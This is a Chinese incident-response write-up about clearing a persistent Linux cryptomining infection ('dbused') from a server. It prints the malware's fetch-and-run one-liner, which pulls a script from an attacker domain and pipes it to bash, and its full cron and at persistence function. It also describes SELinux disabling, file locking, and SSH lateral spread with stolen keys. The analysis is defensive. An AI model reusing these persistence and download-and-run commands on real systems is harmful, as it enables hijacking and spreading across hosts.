## **一、** **概述**

本文主要是记录了一次针对 **挖矿程序** 的应急响应处理，从三个部分来解读此次事件：

> 1、事件描述部分，确认是否有挖矿程序。
>
> 2、现场分析部分，讲了是如何一步一步杀掉挖矿程序。
>
> 3、程序分析部分，针对挖矿脚本的详细解读。杀死竞争挖矿程序、进程守护、传播挖矿。

##  **二、** **疑惑的用户**

前几天接到客户反映，他们有一台服务器资产存在异常现象，原本配置的crontab定时任务全被修改，用户重新对crontab进行配置，无法起到效果，瞬间就会被自动清空掉。定时任务的异常行为导致原本很多的正常业务无法正常运行，同时还发现存在可疑进程，希望能协助进行问题分析，并尽快进行处置。

##  **三、** **受打击的研究员**

研究人员首先分析crontab的问题，使用crontab -l查看定时任务，发现只存在一个可疑的任务进程，如下图所示。

![image.png](https://image.3001.net/images/20220222/1645498279_62144fa714fe8908197de.png!small)

图1 定时命令1

从命令看起来是为了获取http://a.oracleservice.top地址的一

![image.png](https://image.3001.net/images/20220222/1645498280_62144fa8cb3952c35f079.png!small)

图2 聚铭情报云查结构

与客户确认该定时任务是可疑的之后，又用top查看了系统资源，发现了一个程序名称为“dbused”的可疑进程，长时间的cpu资源占用达到了100以上。

利用可疑的进程PID，从/proc/[PID]目录下的’exe’文件定位到源文件来自于/tmp目录下的dbused。

将可疑文件扔到VT进行检测，发现极可能与“CoinMiner”挖矿木马相关。

![image.png](https://image.3001.net/images/20220222/1645498281_62144fa9577517186a28c.png!small)

图3 VT检测结果

看来这次攻击八九不离十就是挖矿木马相关的攻击了，定时程序应该就是用来下载挖矿程序的，只要先把定时程序删除，再删除恶意程序就行了，于是一一删除之，应该就可以交代了。

想法很美好，现实却很残忍。几秒后，发现恶意进程和定时任务全部恢复了，一朝回到解放前，看来是把问题想得太简单了。

##  **四、** **研究员的反击**

研究员开始痛定思痛，其实在第一次分析的时候还忽略了几个关键的线索：

  * 用户反映crontab会被自动刷新（说明存在维持进程）

  * 未查看系统可疑进程

  * 未分析下载的内容

于是乎，ps -ef查看系统进程，发现存在五个以上的恶意下载进程，和之前发现的定时任务一模一样，确实存在多个维持进程。

curl -fsSL http://a.oracleservice.top/xms||wget -q -O-http://a.oracleservice.top/xms||python -c 'import urllib2 as fbi;print
fbi.urlopen("http://a.oracleservice.top/xms").read()')| bash -sh; lwp-download
http://a.oracleservice.top/xms /xms; bash /xms; /xms; rm -rf /xms

![image.png](https://image.3001.net/images/20220222/1645498281_62144fa9c73827439315d.png!small)

图4 查看进程

突破口都指向下载的可疑文件，下载进行分析，分析发现是一个结合资源准备、同类竞争、进程维持、横向扩散、痕迹清除的脚本。

![image.png](https://image.3001.net/images/20220222/1645498283_62144fabc7423ba7c0a40.png!small)

图5 下载可疑文件

###  **Step1：最大化这个进程的使用资源**

![image.png](https://image.3001.net/images/20220222/1645498285_62144fad84847f4f1831b.png!small)

图6 准备工作

1.脚本先将系统的selinux防火墙设置为关闭。

2.脚本将用户最大可用的进程数调整到5万，便于最大化占用主机资源。

3.修改内存参数，目的也是最大化占用主机资源。

###  **Step2：删除竞争进程**

![image.png](https://image.3001.net/images/20220222/1645498286_62144fae228ae606dae9f.png!small)

图7 杀死竞争进程

这里目的是为了关闭一些进程，这里的关闭进程的行为，目的是为了杀掉其他的一些挖矿进程，只允许自己的程序挖矿。

查看列出杀死的连接IP情报，基本都是与挖矿或木马相关。

![image.png](https://image.3001.net/images/20220222/1645498287_62144fafd7c13c3c12b71.png!small)

图8 竞争进程的连接IP1

![image.png](https://image.3001.net/images/20220222/1645498288_62144fb06fd0a169a49fa.png!small)

图9 竞争进程的连接IP2

![image.png](https://image.3001.net/images/20220222/1645498288_62144fb0f00bed53eceb4.png!small)

图10 竞争进程的连接IP3

###  **Step3：删除文件的特殊属性使得文件可以被修改操作**

![image.png](https://image.3001.net/images/20220222/1645498289_62144fb1e20098dc986f2.png!small)

图11 chattr修改文件属性

chattr命令mod解释

i：即Immutable，系统不允许对这个文件进行任何的修改。如果目录具有这个属性，那么任何的进程只能修改目录之下的文件，不允许建立和删除文件。

a:即Append
Only，系统只允许在这个文件之后追加数据，不允许任何进程覆盖或截断这个文件。如果目录具有这个属性，系统将只允许在这个目录下建立和修改文件，而不允许删除任何文件。

最后将定时任务，进行了类似锁定操作。

###  **Step4：确保连通性**

先解除/tmp/dbused目录下面的锁定。

确定本机ip地址的范围（16位掩码）。

确保主机能与恶意负载域名pool.supportxmr.com、a.oracleservice.top连通。

![image.png](https://image.3001.net/images/20220222/1645498290_62144fb2a16fd2b471e93.png!small)

图12 确保连通性

###  **Step5：创建定时任务**

![image.png](https://image.3001.net/images/20220222/1645498291_62144fb33ede7a3507821.png!small)

图13 创建定时任务

一共创建了5个cron维持进程。

  * /etc/cron.d/root

  * /etc/cron.d/apache

  * /etc/cron.d/nginx

  * /var/spool/cron/crontabs

  * /etc/cron.hourly/oanacroner1

![image.png](https://image.3001.net/images/20220222/1645498293_62144fb5640679e81e363.png!small)

图14 /etc/cron.d下的定时任务

![image.png](https://image.3001.net/images/20220222/1645498294_62144fb68d588f2d96bad.png!small)

图15 防止文件被修改

###  **Step6：维持进程1**

即确保dbused这个文件能正常运行。写了几个备用的函数，judge函数就是，如果dbused文件正常运行了，那么就会存在三个连接，如果没有正常运行，那么就重新运行一下dbused文件。

![image.png](https://image.3001.net/images/20220222/1645498296_62144fb80dcf1a010292f.png!small)

图16 judge函数

![image.png](https://image.3001.net/images/20220222/1645498296_62144fb86daf8735b2210.png!small)

图17 judge函数2

###  **Step7：维持进程2**

cronbackup()函数为了确保定时任务的正常运行，一旦其中一个定时任务被删除，就会执行另一个定时任务。

cronbackup() {

pay="(curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as
fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms
$DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR"

status=0

crona=$(systemctl is-active cron)

cronb=$(systemctl is-active crond)

cronatd=$(systemctl is-active atd)

if [ "$crona" == "active" ] ; then

echo "cron okay"

elif [ "$cronb" == "active" ]; then

echo "cron okay"

elif [ "$cronatd" == "active" ] ; then

status=1

else

status=2

fi

if [ $status -eq 1 ] ; then

for a in $(at -l|awk '{print $1}'); do at -r $a; done

echo "$pay" | at -m now + 1 minute

fi

if [ $status -eq 2 ] || [ "$me" != "root" ] ;then

arr[0]="/dev/shm"

arr[1]="/tmp"

arr[2]="/var/tmp"

arr[3]="/home/$(whoami)"

arr[4]="/run/user/$(echo $UID)"

arr[5]="/run/user/$(echo $UID)/systemd"

rand=$[$RANDOM % ${#arr[@]}]

echo "Setting up custom backup"

ps auxf|grep -v grep|grep "cruner" | awk '{print $2}'|xargs kill -9

key="while true; do sleep 60 && $pay; done"

echo -e "$key\n##" > ${arr[$rand]}/cruner && chmod 777 ${arr[$rand]}/cruner

nohup ${arr[$rand]}/cruner >/dev/null 2>&1 &

sleep 15

rm -rf ${arr[$rand]}/cruner

fi

}  
  
---  
  
###  **Step8：横向传播**

从系统文件中获取ssh连接过的IP地址和连接的密钥，再通过遍历尝试ssh连接到别的主机并执行恶意命令。也就是说主机登录过其他主机的话，那么其他主机也会被注入，细思极恐。

ssh连接用到的几个配置

  * -oStrictHostKeyChecking=no （关闭SSH公钥检查，这是ssh一个重要的安全机制，可以防范中间人劫持等黑客攻击。）

  * -oBatchMode=yes（当 key 认证不成功时，不弹出告警防止自动化中断）

  * -oConnectTimeout=5（超时限制）

  * -i（使用密钥文件登录）

![image.png](https://image.3001.net/images/20220222/1645498297_62144fb905ece9fcd2fa7.png!small)

图18 横向传播

![image.png](https://image.3001.net/images/20220222/1645498297_62144fb9d01e2c6abe0ea.png!small)

图19 被获取的部分密钥文件

![image.png](https://image.3001.net/images/20220222/1645498301_62144fbd021bc7d25210e.png!small)

图20 可能被感染的其它主机

###  **Step9：痕迹清除**

对执行过程中遗留的文件进行清除，减小被发现的风险。

![image.png](https://image.3001.net/images/20220222/1645498302_62144fbee439880e9f274.png!small)

图21 清除痕迹

了解清楚这个恶意脚本后，便开始对该恶意程序进行处置：

1\. 先‘service crond status’关闭cron服务。

2\. 对所有cron定时文件进行清除。

3\. 杀死所有恶意进程。

4\. 删除所有下载的相关恶意文件。

5\. 启动selinux。

6\. 修改本机和可能被感染主机的ssh密码。

7\. 对可能感染的主机进行检查。

采取了以上的操作之后，挖矿程序终于不再“复活”了，crontab也恢复正常使用。

>  **参考文章：**
>
> 《linux文件特殊属性
> lsattr,chattr详解》https://blog.csdn.net/sugarCYF/article/details/108034987
>
>
> 《SSH交互式脚本StrictHostKeyChecking选项》https://chuxing.blog.csdn.net/article/details/82425279

